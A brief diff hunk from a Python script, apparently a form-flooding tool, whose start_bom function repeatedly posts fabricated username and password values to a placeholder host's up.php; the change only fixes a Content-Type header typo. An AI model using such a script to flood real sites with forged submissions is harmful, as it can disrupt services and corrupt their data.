@@ -34,7 +34,7 @@ def start_bom():
                 r = requests.post(url='http://xxx.com/up.php',
                                   data={'u': user1, 'p': userpass,
                                         'tijiao': '%E6%8F%90%CD%8F%CD%8F%CD%8F%CD%8F%E4%BA%A4'},
-                                  headers={'Conten  t-Type': 'application/x-www-form-urlencoded'},
+                                  headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                   timeout=2)
                 print(times)
                 print("USER=" + user1)
